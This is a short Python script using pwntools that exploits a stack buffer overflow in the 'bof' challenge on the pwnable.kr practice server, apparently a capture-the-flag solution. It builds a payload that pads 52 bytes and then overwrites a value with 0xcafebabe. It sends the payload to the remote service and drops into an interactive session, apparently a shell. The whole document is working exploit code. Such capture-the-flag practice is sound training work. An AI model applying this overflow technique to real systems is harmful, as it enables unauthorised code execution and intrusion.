from pwn import *

elf = context.binary = ELF('./bof')
context.log_level = 'debug'

offset = 52

payload = flat({offset: [0xcafebabe]})

p = remote('pwnable.kr', 9000)
p.sendline(payload)
p.interactive()

